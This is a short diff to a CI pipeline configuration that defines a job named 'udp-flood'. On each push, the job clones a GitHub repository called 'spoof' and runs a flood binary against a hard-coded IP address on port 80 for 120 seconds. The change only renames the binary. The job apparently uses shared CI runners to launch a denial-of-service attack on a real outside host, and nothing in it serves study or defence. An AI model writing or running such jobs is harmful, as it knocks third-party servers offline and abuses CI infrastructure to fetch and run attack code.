@@ -15,8 +15,8 @@ udp-flood:
         sh -c "
           apt-get update && apt-get install -y git &&
           git clone https://github.com/Titanop242424/spoof.git /app/spoof &&
-          chmod +x /app/spoof/fivem-req &&
-          /app/spoof/fivem-req 162.245.204.228 80 120
+          chmod +x /app/spoof/fivem &&
+          /app/spoof/fivem 162.245.204.228 80 120
         "
   rules:
     - if: $CI_PIPELINE_SOURCE == "push"
